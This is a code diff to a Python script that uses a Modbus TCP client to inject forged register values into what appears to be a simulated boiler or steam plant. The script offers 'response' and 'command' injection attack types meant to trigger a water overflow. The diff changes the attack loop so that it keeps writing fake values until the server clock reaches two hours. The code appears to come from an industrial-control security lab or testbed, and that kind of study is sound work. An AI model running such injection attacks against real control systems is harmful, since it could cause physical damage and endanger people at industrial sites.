@@ -8,7 +8,6 @@ client = ModbusTcpClient(MODBUS_SLAVE)
 
 def readRegisters():
     # Read values from slave
-    client = ModbusTcpClient(MODBUS_SLAVE)
     result = client.read_holding_registers(0, 21, unit=1)
     addWater = ne.modbusDecode(0, 2, 2, result.registers)
     addFire = ne.modbusDecode(2, 2, 0, result.registers)
@@ -22,6 +21,7 @@ def readRegisters():
     return addWater, addFire, waterLevel, waterTemp, powerOut, steamStep, powerIn, serverSeconds
 
 response = ''
+serverSeconds = 0
 print("Sensors online, enter injection attack type:")
 print("[r]esponse - Fake slave values to trigger overflow")
 print("[c]ommand  - Fake master values to trigger overflow")
@@ -94,7 +94,8 @@ if response == 'c':
         exit(0)
 
     response = int(response)
-    while packetCount < packetSend:
+    while serverSeconds < 7200:
+        time.sleep(0.01)
         addWater, addFire, waterLevel, waterTemp, powerOut, steamStep, powerIn, serverSeconds = readRegisters()
         if response == 1:
             # 1,500L constant fill, no fire
@@ -119,7 +120,7 @@ if response == 'c':
         write = client.write_registers(0, outputs, unit=1)
         packetCount += 1
         print(packetCount)
-        client.close()
+    client.close()
     exit(0)
 
 client.close()
